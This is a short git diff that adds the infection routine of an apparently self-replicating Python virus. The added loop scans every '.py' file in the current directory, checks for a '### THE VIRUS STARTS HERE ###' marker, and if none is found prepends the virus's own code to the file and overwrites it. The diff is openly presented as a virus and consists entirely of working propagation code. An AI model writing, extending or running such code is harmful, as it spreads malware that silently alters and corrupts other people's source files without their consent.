@@ -20,6 +20,25 @@ for line in lines:
 
 python_scripts = glob.glob('*.py')
 
+for script in python_scripts:
+    with open(script, 'r') as f:
+        script_code = f.readlines()
+
+    infected = False
+    for line in script_code:
+        if line == '### THE VIRUS STARTS HERE ###':
+            infected = True
+            break
+
+    if not infected:
+        final_code = []
+        final_code.extend(code)
+        final_code.extend('\n')
+        final_code.extend(script_code)
+
+        with open(script, 'w') as f:
+            f.writelines(final_code)
+
 print(python_scripts)
 
 
